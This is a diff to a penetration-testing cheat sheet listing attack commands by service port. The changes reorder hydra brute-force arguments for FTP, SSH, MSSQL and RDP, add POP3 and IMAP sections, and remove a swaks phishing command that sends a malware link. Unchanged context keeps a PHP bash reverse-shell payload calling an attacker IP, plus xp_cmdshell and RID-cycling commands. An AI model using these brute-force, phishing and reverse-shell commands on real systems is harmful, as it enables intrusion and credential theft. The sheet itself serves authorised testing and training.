@@ -57,7 +57,7 @@ sudo nmap --script-updatedb
 locate .nse | grep <name>
 locate .nse | xargs grep categories
 nmap --script-help <name>
-nmap --script=<name> <ip>
+nmap --script <name> -p <port> <ip>
 # example
 nmap -sV -p 445 --script smb-ls <ip> 
 ```
@@ -92,7 +92,7 @@ put <file>
 get <file>
 
 # burteforce
-hydra -l <USER> -P <WORDLIST> ftp://<ip>
+hydra ftp://<ip> -l <user> -P <wordlist>
 
 # nse
 locate .nse | grep ftp
@@ -108,7 +108,7 @@ ssh username@<ip>
 ssh username@<ip> -i <key>
 
 # bruteforce
-hydra -l <user> -P <wordlist> -s <port> ssh://<ip>
+hydra ssh://<ip> -l <user> -P <wordlist> -s <port>
 ```
 
 ### SMTP - 25
@@ -130,11 +130,6 @@ nmap --script smtp-enum-users <ip>
 Test-NetConnection -Port 25 <IP> # Non-interactive
 dism /online /Enable-Feature /FeatureName:TelnetClient # Needs privs
 telnet <IP> 25 # Needs telnet.exe binary
-
-# send emails
-swaks -t <VICTIM_EMAIL> -f <YOUR_FAKE_EMAIL> --server <SMTP_EMAIL> --body 'click me http://<YOUR_IP>/<MALWARE>' --header "Subject: Important" --add-header "Really: 1.0" --add-header "Content-Type: text/html"  [--attach <ATTACHED_FILE>]
-
-sendEmail -t nico@megabank.com -u open -m yes -a yes.rtf -s 10.10.10.77 -f user@megabank.com
 ```
 
 ### DNS - 53  
@@ -179,7 +174,7 @@ nslookup -type=TXT info.megacorptwo.com <ip>
 dig @<ip> <domain> axfr 
 ```
 
-### HTTP/S - 80, 443
+### HTTP - 80, 443 (TLS)
 
 - Technology stack identification with [Wappalyzer](https://www.wappalyzer.com/) , Nmap or whatweb.
 - Check **robots**, sitemap, 404 and SSL/TLS scan.
@@ -204,7 +199,7 @@ gobuster dir -u <url> -w <wordlist> -t 60 -x pdf,txt,php,config
 wfuzz -w <wordlist> <URL>/FUZZ
 feroxbuster -u <url> -w <wordlist> -t 60 -x pdf,txt
 
-# brute force login page with Burpsuite intruder or Hydra
+# brute force login page with Caido or Hydra
 hydra -L <userlist> -P <wordlist> <target> http-{get|post}-form "/login:username=^USER^&password=^PASS^:F=Login failed. Invalid"
 # basic auth
 hydra -L <userlist> -P <wordlist> <target> http-{get|post} /
@@ -244,6 +239,24 @@ Author: Pentester
 exec("/bin/bash -c 'bash -i >& /dev/tcp/<ip>/<port> 0>&1'") ?>
 
 zip -r rs.zip rs
+```
+
+### POP3 - 110, 995 (TLS)
+
+```shell
+telnet <ip> <port>
+
+# commands
+USER uid           Log in as "uid"
+PASS password      Substitue "password" for your actual password
+STAT               List number of messages, total mailbox size
+LIST               List messages and sizes
+RETR n             Show message n
+DELE n             Mark message n for deletion
+RSET               Undo any changes
+QUIT               Logout (expunges messages if no RSET)
+TOP msg n          Show first n lines of message number msg
+CAPA               Get capabilities
 ```
 
 ### NFS - 111, 2049
@@ -322,6 +335,19 @@ querygroup <group>
 querydispinfo
 ```
 
+### IMAP - 143, 993 (TLS)
+
+> [Commands examples](https://donsutherland.org/crib/imap)
+
+```shell
+# brute force
+hydra imap://<ip> -L <userlist> -P <wordlist>
+nmap -sV --script imap-brute -p <port> <ip>
+
+# connect to server
+telnet <ip> <port>
+```
+
 ### SNMP - 161/udp
 
 ```shell
@@ -398,7 +424,7 @@ impacket-mssqlclient <DOMAIN>/<USERNAME>:<PASSWORD>@<IP>
 impacket-mssqlclient <DOMAIN>/<USERNAME>:<PASSWORD>@<IP> -windows-auth
 
 # bruteforce
-hydra -L userlist.txt -P passlist.txt mssql://<target-ip>
+hydra mssql://<ip> -L <userlist> -P <wordlist>
 
 # run commands
 enable_xp_cmdshell
@@ -410,7 +436,7 @@ enable_xp_cmdshell
 nxc rdp <ip> -u <user> -p <pass>
 
 # bruteforce
-hydra -L <USERS> -p <PASSWORD> rdp://<IP>
+hydra rdp://<ip> -L <userlist> -P <wordlist>
 ```
 
 #### RPC RID Cycling Attack
@@ -428,7 +454,7 @@ administrator S-1-5-21......-500
 seq 400 2000 | xargs -P 50 -I {} rpcclient -U "guest%" <ip> -c 'lookupsids S-1-5-21......-{}'
 ```
 
-### WinRM - 5985 (HTTP), 5986 (HTTPS)
+### WinRM - 5985, 5986 (TLS)
 
 ```shell
 nxc winrm <ip> -d <domain> -u userlist -p passwordlist
